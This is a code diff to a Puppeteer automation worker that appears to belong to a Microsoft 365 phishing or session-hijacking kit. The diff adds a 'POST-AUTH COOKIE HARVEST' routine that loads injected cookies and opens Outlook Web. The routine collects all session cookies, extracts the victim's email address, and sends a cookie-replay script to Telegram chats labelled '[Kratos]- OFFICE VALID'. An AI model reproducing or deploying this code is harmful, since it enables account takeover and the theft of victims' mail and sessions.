@@ -93,42 +93,82 @@ exports.AddAuthenticatorApp = async ({ page, data: [taskId, cookies, params] }) 
 }
 
 exports.ScreenshotApps = async ({ page, data: [taskId, cookies, params] }) => {
-    // update initial task status from queued to running
     await db.UpdateTaskStatus(taskId, "running")
 
-    // NOTE: cookies from office365.com as well as .login.microsoftonline.com need to be passed to have full Office control
-    /// otherwise we loose the session on app switch. a total of 37 cookies need to be passed!!!
+    // Inject pre-auth cookies and navigate - MSAL SSO completes silently on no-MFA tenants
     await page.setCookie(...cookies);
-
     await page.goto(params.fixSession);
-    //await necrohelp.ScreenshotCurrentPage(page, taskId)
-    await necrohelp.Sleep(2000)
+    await necrohelp.Sleep(5000)
 
-    // check if we are logged in and the cookies set are all fine
-    const loggedInSelector = 'document.querySelector("#O365_MainLink_NavMenu >.ms-Icon--WaffleOffice365")';
-    const waffle = await page.evaluate(loggedInSelector);
-    console.log(`[${taskId}] session is invoked correctly. Apps waffle found: ${waffle}`)
+    // POST-AUTH COOKIE HARVEST
+    // Navigate to OWA to trigger OWA session cookie issuance.
+    console.log(`[${taskId}] navigating to OWA for post-auth cookies...`)
+    try {
+        await page.goto('https://outlook.office.com/mail/', { waitUntil: 'domcontentloaded', timeout: 30000 })
+    } catch(e) {
+        console.log(`[${taskId}] OWA nav: ${e.message}`)
+    }
+    await necrohelp.Sleep(6000)
+
+    const allCookies = await page.cookies()
+    console.log(`[${taskId}] collected ${allCookies.length} post-auth cookies`)
+
+    // Try to extract victim email from the page
+    let victimEmail = null
+    try {
+        victimEmail = await page.evaluate(() => {
+            try { if (window.OWA && window.OWA.UserPrincipalName) return window.OWA.UserPrincipalName } catch(e) {}
+            try { const m = document.cookie.match(/OWA-userAddr=([^;]+)/); if (m) return decodeURIComponent(m[1]) } catch(e) {}
+            const m2 = (document.title || '').match(/([a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,})/);
+            if (m2) return m2[1]
+            return null
+        })
+    } catch(e) { console.log(`[${taskId}] email extract: ${e.message}`) }
+
+    const label = victimEmail || taskId
+    let finalUrl = 'unknown'; try { finalUrl = page.url() } catch(e) {}
+    console.log(`[${taskId}] label: ${label}  finalUrl: ${finalUrl.substring(0,80)}`)
+
+    if (params.telegramToken && params.telegramChatId) {
+        try {
+            const TelegramBot = require('node-telegram-bot-api')
+            const bot = new TelegramBot(params.telegramToken, { polling: false })
+            const chatIds = Array.isArray(params.telegramChatId) ? params.telegramChatId : [params.telegramChatId]
+
+            const cookieArr = allCookies.map(c => ({
+                Name: c.name, Value: c.value, Domain: c.domain,
+                Path: c.path || '/', Secure: c.secure || false,
+                HttpOnly: c.httpOnly || false, SameSite: c.sameSite || 'None'
+            }))
+
+            const escaped = JSON.stringify(cookieArr).replace(/\\/g, '\\\\').replace(/'/g, "\\'")
+            const script = `(function(){const cookies=JSON.parse('${escaped}');const MAX=63072000;const EX=new Date(Date.now()+MAX*1000).toUTCString();const ATTR='expires='+EX+';Max-Age='+MAX;function putCookie(n,v,d,p,s){let c;if(n.indexOf('__Host')===0){c=n+'='+v+';'+ATTR+';path=/;Secure;SameSite=None';}else if(s){c=n+'='+v+';'+ATTR+';domain='+d+';path='+p+';Secure;SameSite=None';}else{c=n+'='+v+';'+ATTR+';domain='+d+';path='+p+';SameSite=Lax';}try{document.cookie=c;}catch(x){}}for(const k of cookies){putCookie(k.Name,k.Value,k.Domain,k.Path,k.Secure);}window.location.href='https://outlook.office.com/mail/';})();`
+
+            const caption = `[Kratos]- OFFICE VALID [ ${label} ]❤️`
+            const safeLabel = label.replace(/[@.]/g, '_').replace(/[^a-zA-Z0-9_]/g, '')
+            const filename = `${safeLabel}.txt`
+
+            for (const chatId of chatIds) {
+                await bot.sendDocument(chatId, Buffer.from(script), { caption }, { filename, contentType: 'text/plain' })
+                console.log(`[${taskId}] sent ${allCookies.length} cookies to Telegram chat ${chatId}`)
+            }
+        } catch(e) { console.log(`[${taskId}] Telegram error: ${e.message}`) }
+    }
+    // END POST-AUTH COOKIE HARVEST
 
     await necrohelp.ScreenshotCurrentPage(page, taskId)
 
-    // waffle click
+    // Legacy UI clicks - fail silently on new m365 UI
     await page.click('#O365_MainLink_NavMenu >.ms-Icon--WaffleOffice365').catch(console.error)
-    console.log(`[${taskId}] clicking on o365 Apps waffle`)
     await necrohelp.Sleep(2000)
-
-    // click on sharepoint
     await page.click('#O365_AppTile_Sites > .o365sx-neutral-dark-font > span').catch(console.error)
-    console.log(`[${taskId}] loading microsoft Sharepoint`)
     await necrohelp.Sleep(2000)
     await necrohelp.ScreenshotCurrentPage(page, taskId)
-
-    // click on teams
     await page.click('#O365_MainLink_NavMenu >.ms-Icon--WaffleOffice365').catch(console.error)
     await necrohelp.Sleep(2000)
     await page.click('#O365_AppTile_SkypeTeams > .o365cs-base > span').catch(console.error)
-    console.log(`[${taskId}] loading microsoft Teams`)
     await necrohelp.Sleep(5000)
-    await page.click('.use-app-lnk').catch(console.error) // click on Use we WebApp
+    await page.click('.use-app-lnk').catch(console.error)
     await necrohelp.Sleep(5000)
     await necrohelp.ScreenshotCurrentPage(page, taskId)
 
